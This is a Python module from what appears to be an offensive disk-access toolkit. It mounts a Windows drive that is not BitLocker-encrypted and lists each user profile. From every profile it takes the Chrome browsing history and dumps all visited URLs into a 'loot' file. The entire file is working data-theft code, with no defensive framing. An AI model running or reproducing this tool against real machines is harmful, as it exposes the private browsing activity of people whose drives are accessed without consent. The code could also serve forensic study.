import subprocess
import shutil
import os
import time
import sqlite3
def __main__(drive_name,drive_format):
	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
		print("[-] This module does not work with a Bitlocker drive")
	elif drive_name == None:
		print("[-] This module needs a drive to work; use 'usedrive'")
	else:
		if not os.path.exists("tofu_tmp/windows_filesystem"):
			os.mkdir("tofu_tmp/windows_filesystem")
		else:
			try:
				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
			except:
				pass
		print("[#] Preparing loot file at 'tofu_loot/chrome_history.txt'")
		try:
			open("tofu_loot/chrome_history.txt","x").close()
		except FileExistsError:
			pass
		
		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
		try:
			users = os.listdir("tofu_tmp/windows_filesystem/Users/")
			history_file = open("tofu_loot/chrome_history.txt","a")
			for user in users:
				print(f"[+++] ------- - -// USER DISCOVERED : {user}")
				history_file.write(f"\n=============================\n===== > {user} : \n")
				try:
					path = f"tofu_tmp/windows_filesystem/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History"
					conn = sqlite3.connect(path)
					try:
						cursor = conn.cursor()
						cursor.execute("SELECT url FROM urls")
						for url in cursor.fetchall():
							history_file.write(f"{url[0]}\n")
							print(f"[###] URL : {url[0]}")
							
						conn.close()
					except Exception as sqlite_error:
						print(f"[-] Unknown error : {sqlite_error}")
						conn.close()
				except:
					print("[---] User does not have a profile")
				
					
					
		except Exception as open_error:
			print(f"[-] Error {open_error}")
		time.sleep(2)	
		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
